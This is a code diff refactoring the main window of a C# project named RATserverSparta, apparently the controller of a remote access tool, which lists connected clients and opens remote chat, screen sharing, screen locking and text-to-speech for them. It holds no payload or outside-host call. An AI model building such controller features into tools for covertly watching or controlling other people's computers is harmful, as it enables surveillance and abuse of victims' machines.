@@ -1,5 +1,6 @@
 ﻿using RATserverSparta.Client;
 using RATserverSparta.GUI.Main;
+using RATserverSparta.Socket;
 using RATserverSparta.Sockets;
 using RATserverSparta.Tools.Chat;
 using RATserverSparta.Tools.Screen;
@@ -21,13 +22,13 @@ namespace RATserverSparta
     public partial class MainGUI : Form
     {
         public int ConnectedClients = 0;
-        private Server SocketServerClassInstance;
+        private SocketAccept SocketAcceptClassInstance;
         public MainGUI()
         {
             InitializeComponent();
-            this.SocketServerClassInstance = new Server(this);
+            this.SocketAcceptClassInstance = new SocketAccept(this);
             ClientsList.MouseUp += MouseEvent;
-            this.SocketServerClassInstance.OnNewConnection += NewConnection;
+            this.SocketAcceptClassInstance.OnNewConnection += NewConnection;
             this.FormClosing += Close;
         }
 
@@ -39,18 +40,19 @@ namespace RATserverSparta
         private void serverCreationStripMenuItem_Click(object sender, EventArgs e)
         {
             //If Socket Server creation returned no errors
-            if (this.SocketServerClassInstance.Create())
+            System.Net.Sockets.Socket Server = SocketCreate.Create(this.HostValue.Text);
+            if (Server != null)
             {
                 //Run Client Accepting at a new thread
                 new Thread(new ThreadStart(() =>
                 {
                     //@NOTICE: Accept() is not the default Socket function, This is my own function at the SocketServer class.
-                    this.SocketServerClassInstance.Accept();
+                    this.SocketAcceptClassInstance.Accept(Server);
                 })).Start();
             }
         }
 
-        private void NewConnection(Client.Client ClientClassInstance, Socket client)
+        private void NewConnection(Client.Client ClientClassInstance, System.Net.Sockets.Socket client)
         {
             Logs log = new Logs(this);
             GUI.Main.ListView Action = new GUI.Main.ListView(this);
@@ -79,7 +81,7 @@ namespace RATserverSparta
                 for (int i = count; i >= 0; i--)
                 {
                     string SelectedClientString = ClientsList.SelectedItems[i].Text;
-                    Socket SelectedClientSocket = this.SocketServerClassInstance.ClientSocketMap[SelectedClientString];
+                    System.Net.Sockets.Socket SelectedClientSocket = this.SocketAcceptClassInstance.ClientSocketMap[SelectedClientString];
                     SocketSend Socket = new SocketSend(SelectedClientSocket);
                     Socket.Send(Encoding.ASCII.GetBytes("\0"), type);
                 }
@@ -108,8 +110,8 @@ namespace RATserverSparta
             if (SendDataAfterChecks(2))
             {
                 string SelectedClientString = ClientsList.SelectedItems[ClientsList.SelectedItems.Count - 1].Text;
-                Client.Client Client = this.SocketServerClassInstance.ClientInstanceMap[SelectedClientString];
-                Socket SelectedClientSocket = this.SocketServerClassInstance.ClientSocketMap[SelectedClientString];
+                Client.Client Client = this.SocketAcceptClassInstance.ClientInstanceMap[SelectedClientString];
+                System.Net.Sockets.Socket SelectedClientSocket = this.SocketAcceptClassInstance.ClientSocketMap[SelectedClientString];
 
                 Chat chat = new Chat(Client, SelectedClientSocket);
                 chat.Show();
@@ -122,7 +124,7 @@ namespace RATserverSparta
             if (SendDataAfterChecks(0))
             {
                 string SelectedClientString = ClientsList.SelectedItems[ClientsList.SelectedItems.Count - 1].Text;
-                Socket SelectedClientSocket = this.SocketServerClassInstance.ClientSocketMap[SelectedClientString];
+                System.Net.Sockets.Socket SelectedClientSocket = this.SocketAcceptClassInstance.ClientSocketMap[SelectedClientString];
 
                 ComputerTalk ComputerSpeech = new ComputerTalk(SelectedClientSocket);
                 ComputerSpeech.Show();
@@ -141,7 +143,7 @@ namespace RATserverSparta
             if (SendDataAfterChecks(0))
             {
                 string SelectedClientString = ClientsList.SelectedItems[ClientsList.SelectedItems.Count - 1].Text;
-                Socket SelectedClientSocket = this.SocketServerClassInstance.ClientSocketMap[SelectedClientString];
+                System.Net.Sockets.Socket SelectedClientSocket = this.SocketAcceptClassInstance.ClientSocketMap[SelectedClientString];
 
                 ComputerTalk ComputerSpeech = new ComputerTalk(SelectedClientSocket);
                 ComputerSpeech.Show();
@@ -153,8 +155,8 @@ namespace RATserverSparta
             if (SendDataAfterChecks(8))
             {
                 string SelectedClientString = ClientsList.SelectedItems[ClientsList.SelectedItems.Count - 1].Text;
-                Client.Client Client = this.SocketServerClassInstance.ClientInstanceMap[SelectedClientString];
-                Socket SelectedClientSocket = this.SocketServerClassInstance.ClientSocketMap[SelectedClientString];
+                Client.Client Client = this.SocketAcceptClassInstance.ClientInstanceMap[SelectedClientString];
+                System.Net.Sockets.Socket SelectedClientSocket = this.SocketAcceptClassInstance.ClientSocketMap[SelectedClientString];
 
                 ScreenShare ScreenShare = new ScreenShare(Client, SelectedClientSocket);
                 ScreenShare.Show();
@@ -166,7 +168,7 @@ namespace RATserverSparta
             if (SendDataAfterChecks(0))
             {
                 string SelectedClientString = ClientsList.SelectedItems[ClientsList.SelectedItems.Count - 1].Text;
-                Socket SelectedClientSocket = this.SocketServerClassInstance.ClientSocketMap[SelectedClientString];
+                System.Net.Sockets.Socket SelectedClientSocket = this.SocketAcceptClassInstance.ClientSocketMap[SelectedClientString];
 
                 ScreenLock ScreenShare = new ScreenLock(SelectedClientSocket);
                 ScreenShare.Show();
